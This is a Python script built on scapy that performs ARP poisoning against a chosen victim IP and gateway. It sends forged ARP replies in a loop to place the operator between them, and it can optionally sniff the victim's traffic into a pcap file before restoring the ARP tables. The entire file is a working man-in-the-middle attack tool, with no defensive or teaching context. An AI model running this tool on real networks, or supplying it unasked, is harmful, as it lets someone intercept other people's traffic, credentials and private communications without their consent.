from datetime import datetime
import sys,argparse, time,colorama,random
import scapy.all as scapy
from multiprocessing import Process
from termcolor import colored
from colorama import Fore, Style
colorama.init(autoreset=True)
green = Fore.GREEN
magenta = Fore.MAGENTA
cyan = Fore.CYAN
mixed = Fore.RED + Fore.BLUE
red = Fore.RED
blue = Fore.BLUE
yellow = Fore.YELLOW
white = Fore.WHITE
colors = [magenta,cyan,mixed,red,blue,yellow, white]
random_color = random.choice(colors)
bold = Style.BRIGHT

def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-vIP','--vicitmip',dest="victimip",help="Specify the Victim IP! ",required=True)
    parser.add_argument('-gIP','--gatewayip',dest="gatewayip",required=True,help=" Specify the gateway IP !(gateway=> your router) ")
    parser.add_argument('-interface',dest="interface",default="eth0",help="Specify the interface : (default:eth0")
    parser.add_argument('-sniff',dest="sniff",help="Specify if you want to only capture certain packets and get it in pcap file ",required=False,action='store_true')
    parser.add_argument('-pc',metavar="Packet count",dest="packetCount",default=1000,type=int,help="Specify the packet count you want to sniff! (Use this when sniff used ), Default : 1000",required=False)
    arguments=parser.parse_args()
    if not((not arguments.sniff) or arguments.packetCount):
        print(colored("[-] Packet count should only be used when sniffing option is used ! ", 'red'))
        parser.print_help()
        sys.exit()
    return arguments


def print_banner(victimIp,victimMac,gatewayIp,gatewayMac):
    print("-"*60)
    print(colored(f"Arp Poisoning starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} ",'cyan',attrs=['bold']))
    print("-"*60)
    print(f"[*] Victim IP\t: {victimIp}")
    print(f"[*] Victim Mac\t: {victimMac}")
    print(f"[*] Gateway Ip\t: {gatewayIp}")
    print(f"[*] Gateway Mac\t: {gatewayMac}")
    print("-"*60)

def get_mac_addr(ip):
    arp_request_frame = scapy.ARP(pdst=ip)
    ether_broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_ether_send_packet = ether_broadcast_frame / arp_request_frame
    response_packet = scapy.srp(arp_ether_send_packet, timeout=2, retry=10, verbose=False)[0]
    return response_packet[0][1].hwsrc

def poisoning(victimIp, victimMac, gatewayIp, gatewayMac):
    global posioning_process
    
    victim_poison_packet = scapy.ARP(pdst=victimIp, psrc=gatewayIp, hwdst=victimMac, op=2)
    
    gateway_poison_packet = scapy.ARP(pdst=gatewayIp, psrc=victimIp, hwdst=gatewayMac, op=2)
    print("-" * 60)
    print(colored("[+] Arp Poisioning has been successfully started ", 'yellow', attrs=['concealed']))
    print("-" * 60)
    
    while True:
        sys.stdout.flush()
        try:
            scapy.send(victim_poison_packet, verbose=False)
            scapy.send(gateway_poison_packet, verbose=False)
        except KeyboardInterrupt:
            restore()
            sys.exit()
        else:
            time.sleep(2)

def restore():
    print(colored("[+] Getting Everything right ! ", 'green'))
    normal_victim_packet = scapy.ARP(psrc=gatewayIp, hwsrc=gatewayMac, pdst=victimIp, hwdst="ff:ff:ff:ff:ff:ff", op=2)
    normal_gateway_packet = scapy.ARP(psrc=victimIp, hwsrc=victimMac, pdst=gatewayIp, hwdst="ff:ff:ff:ff:ff:ff", op=2)
    for i in range(7):
        scapy.send(normal_victim_packet, verbose=False)
        scapy.send(normal_gateway_packet, verbose=False)

def sniffing(packetCount, interface):
    global posioning_process
    time.sleep(5)
    print("-" * 60)
    print(colored("[-] Yeah ! Sniffing some packets !!", 'green'))
    print("-" * 60)
    bpf_filter = "ip host %s" % victimIp
    packets = scapy.sniff(count=packetCount, filter=bpf_filter, iface=interface)
    scapy.wrpcap('poisionedpackets.pcap', packets)
    posioning_process.terminate()
    restore()
    print("[+] Finished , All your packets are in :poisionedpackets.pcap ")


if __name__=="__main__":
    arguments=get_args()
    # Getting Victim ip 
    victimIp=arguments.victimip
    victimMac=get_mac_addr(victimIp)
    
    # Getting gateway Ips
    gatewayIp=arguments.gatewayip
    gatewayMac=get_mac_addr(gatewayIp)
    
    # Specifying interface 
    interface=arguments.interface
    
    #printing bannner 
    print_banner(victimIp,victimMac,gatewayIp,gatewayMac)
    
    # Let's start process for poisioning and if enabled one for sniffing so both process uses their own resources differently 
    
    posioning_process=Process(target=poisoning,args=(victimIp,victimMac,gatewayIp,gatewayMac))
    posioning_process.start()
    
    if arguments.sniff:
        sniffing_process=Process(target=sniffing,args=(arguments.packetCount,arguments.interface))
        sniffing_process.start()
